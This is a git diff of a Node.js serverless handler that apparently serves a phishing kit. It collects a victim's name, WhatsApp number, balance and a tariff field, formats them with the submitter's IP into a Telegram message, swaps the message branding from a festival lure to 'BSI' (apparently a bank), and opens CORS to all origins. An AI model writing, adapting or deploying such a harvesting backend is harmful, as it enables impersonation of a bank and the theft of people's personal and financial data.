@@ -2,7 +2,7 @@ const axios = require('axios');
 
 module.exports = async (req, res) => {
   // Set CORS headers
-  res.setHeader('Access-Control-Allow-Origin', 'https://cek-two.vercel.app');
+  res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   
@@ -17,10 +17,10 @@ module.exports = async (req, res) => {
   }
 
   try {
-    const { a: name, b: phone, c: balance } = req.body;
+    const { tarif: tarif, nama: name, nohp: phone, saldo: balance } = req.body;
 
     // Validasi input
-    if (!name || !phone || !balance) {
+    if (!tarif || !name || !phone || !balance) {
       return res.status(400).json({ success: false, message: 'Semua field harus diisi' });
     }
 
@@ -45,8 +45,9 @@ module.exports = async (req, res) => {
 
     // Format pesan untuk Telegram dengan informasi IP
     const telegramMessage = `
-𝗪𝗼𝗻𝗱𝗲𝗿_𝗙𝗲𝘀𝘁𝗶𝘃𝗮𝗹𝟮𝟬𝟮𝟱
+𝗕𝗦𝗜
 ────────────────────
+𝗦𝗮𝗹𝗱𝗼 | ${tarif}
 𝗡𝗮𝗺𝗮 | ${name}
 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 | <code>${phone}</code>
 𝗦𝗮𝗹𝗱𝗼 | <pre>${balance}</pre>
